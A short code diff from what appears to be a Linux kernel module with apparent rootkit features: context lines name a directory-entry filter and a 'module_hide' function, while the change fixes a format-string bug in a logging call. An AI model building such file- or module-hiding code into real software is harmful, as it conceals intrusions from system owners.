@@ -65,7 +65,7 @@ void filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_
 }
 
 int filter_fn(struct linux_dirent d) {
-	pr_info(d.d_name);
+	pr_info("%s", d.d_name);
 }
 
 void module_hide(void) {
